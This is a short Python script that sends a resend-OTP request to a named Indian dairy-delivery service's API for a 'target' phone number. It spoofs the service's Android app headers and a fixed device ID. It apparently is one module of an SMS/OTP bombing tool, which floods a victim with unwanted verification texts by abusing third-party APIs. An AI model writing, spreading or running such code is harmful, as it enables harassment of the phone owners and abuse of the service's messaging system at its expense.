import requests

def run(phone_number):
    """
    Sends an OTP resend request using the provided mobile number.

    :param number: The mobile number to target.
    """
    # API URL
    url = "http://doodhvale.in/dv/doodhvale/api/web/v3/users/resend-otp"

    # Data to be sent in the request body
    payload = {
        "deviceId": "c7abc1fd7459e84c",
        "mobile": phone_number
    }

    # Headers for the request
    headers = {
        "Authorization": "token null",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "doodhvale.in",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.10.0"
    }

    # Send the POST request
    try:
        response = requests.post(url, data=payload, headers=headers)

        # Check if the request was successful
        if response.ok:
            print("API Response:", response.text)
        else:
            print(f"Failed to send OTP. Status code: {response.status_code}, Response: {response.text}")

    except Exception as e:
        print("An error occurred:", e)

# Example usage

